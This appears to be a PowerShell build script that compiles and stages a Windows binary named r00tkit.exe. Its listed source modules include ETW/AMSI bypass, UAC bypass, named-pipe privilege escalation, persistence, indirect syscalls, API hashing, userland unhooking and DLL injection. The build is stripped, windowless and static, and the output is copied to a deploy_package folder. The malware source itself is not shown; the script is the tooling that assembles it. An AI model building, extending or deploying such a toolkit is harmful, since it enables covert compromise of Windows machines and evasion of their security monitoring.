# Build avec affichage des erreurs

$ErrorActionPreference = "Stop"
$RootDir = $PSScriptRoot

Write-Host "`n[DEBUG] Compiling r00tkit.exe..." -ForegroundColor Yellow

Push-Location "$RootDir\src"

# Assembly
Write-Host "  [1] Assembling dosyscall.S..." -ForegroundColor Gray
& gcc -c dosyscall.S -o dosyscall.o
if ($LASTEXITCODE -ne 0) {
    Write-Host "  ERROR: Assembly failed!" -ForegroundColor Red
    Pop-Location
    exit 1
}

# Resources (skip if not found)
$resourceObj = ""
if (Test-Path "resources.rc") {
    Write-Host "  [2] Compiling resources..." -ForegroundColor Gray
    & windres resources.rc -O coff -o resources.o
    if ($LASTEXITCODE -eq 0) {
        $resourceObj = "resources.o"
    }
} else {
    Write-Host "  [2] Skipping resources (not found)..." -ForegroundColor Gray
}

# Main compilation
Write-Host "  [3] Compiling r00tkit.exe..." -ForegroundColor Gray

$CFLAGS = @(
    "-std=c++17",
    "-static",
    "-static-libgcc",
    "-static-libstdc++",
    "-mwindows",
    "-Os",
    "-s",
    "-I..\include"
)

# Build command with objects
$sources = @(
    "main.cpp",
    "Unhooking.cpp",
    "ETWAMSIBypass.cpp",
    "UACBypass.cpp",
    "NamedPipePrivEsc.cpp",
    "Persistence.cpp",
    "IndirectSyscalls.cpp",
    "APIHashing.cpp",
    "ThreadAPIWrappers.cpp",
    "DLLInjector.cpp",
    "dosyscall.o"
)

# Add resources.o only if it exists
if ($resourceObj -ne "") {
    $sources += $resourceObj
}

Write-Host "`nOUTPUT:" -ForegroundColor Cyan

& g++ @CFLAGS @sources -o r00tkit.exe -lwinhttp -ladvapi32 -lntdll -lole32 -loleaut32 -luuid -lws2_32

if ($LASTEXITCODE -eq 0 -and (Test-Path "r00tkit.exe")) {
    $size = [math]::Round((Get-Item "r00tkit.exe").Length / 1MB, 2)
    Write-Host "`n? SUCCESS: r00tkit.exe ($size MB)" -ForegroundColor Green
    
    # Copy to deploy_package
    $deployDir = Join-Path $RootDir "deploy_package"
    if (-not (Test-Path $deployDir)) { New-Item -ItemType Directory -Path $deployDir | Out-Null }
    Copy-Item "r00tkit.exe" "$deployDir\r00tkit.exe" -Force
    Write-Host "? Copied to deploy_package/" -ForegroundColor Green
} else {
    Write-Host "`n? ERROR: Compilation failed!" -ForegroundColor Red
    Write-Host "Exit code: $LASTEXITCODE" -ForegroundColor Red
}

Pop-Location
